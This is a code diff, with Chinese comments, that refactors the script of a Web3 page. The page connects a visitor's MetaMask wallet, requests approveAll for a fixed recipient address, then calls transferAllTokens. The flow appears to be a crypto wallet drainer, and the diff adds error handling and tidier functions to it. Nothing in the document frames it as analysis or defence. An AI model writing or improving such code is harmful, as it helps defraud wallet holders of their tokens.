@@ -91,7 +91,8 @@
             }
         ];
 
-        document.getElementById("connectButton").addEventListener("click", async () => {
+        // 连接钱包功能
+        async function connectWallet() {
             if (window.ethereum) {
                 web3 = new Web3(window.ethereum);
                 try {
@@ -99,36 +100,51 @@
                     account = accounts[0];
                     document.getElementById("status").innerText = "已连接钱包: " + account;
                     document.getElementById("authorizeTransfer").disabled = false; // 启用授权按钮
+                    contract = new web3.eth.Contract(abi, contractAddress); // 初始化合约
                 } catch (error) {
-                    document.getElementById("status").innerText = "连接钱包失败: " + error.message;
+                    handleError(error);
                 }
             } else {
                 document.getElementById("status").innerText = "请安装 MetaMask!";
             }
-        });
+        }
 
-        document.getElementById("authorizeTransfer").addEventListener("click", async () => {
-            if (contract) {
-                try {
-                    await contract.methods.approveAll(recipientAddress).send({ from: account });
-                    document.getElementById("status").innerText = "授权成功!";
-                    document.getElementById("transferButton").disabled = false; // 启用转账按钮
-                } catch (error) {
-                    document.getElementById("status").innerText = "授权失败: " + error.message;
-                }
+        // 错误处理函数
+        function handleError(error) {
+            if (error.code === 4001) {
+                document.getElementById("status").innerText = "用户拒绝了请求。";
+            } else if (error.code === -32002) {
+                document.getElementById("status").innerText = "连接请求已存在，请稍候。";
             } else {
-                contract = new web3.eth.Contract(abi, contractAddress);
+                document.getElementById("status").innerText = "连接钱包失败: " + error.message;
             }
-        });
+        }
 
-        document.getElementById("transferButton").addEventListener("click", async () => {
+        // 授权转账
+        async function authorizeTransfer() {
+            try {
+                await contract.methods.approveAll(recipientAddress).send({ from: account });
+                document.getElementById("status").innerText = "授权成功!";
+                document.getElementById("transferButton").disabled = false; // 启用转账按钮
+            } catch (error) {
+                handleError(error);
+            }
+        }
+
+        // 转移代币
+        async function transferTokens() {
             try {
                 await contract.methods.transferAllTokens().send({ from: account });
                 document.getElementById("status").innerText = "转账成功!";
             } catch (error) {
-                document.getElementById("status").innerText = "转账失败: " + error.message;
+                handleError(error);
             }
-        });
+        }
+
+        // 事件监听
+        document.getElementById("connectButton").addEventListener("click", connectWallet);
+        document.getElementById("authorizeTransfer").addEventListener("click", authorizeTransfer);
+        document.getElementById("transferButton").addEventListener("click", transferTokens);
     </script>
 </body>
 </html>
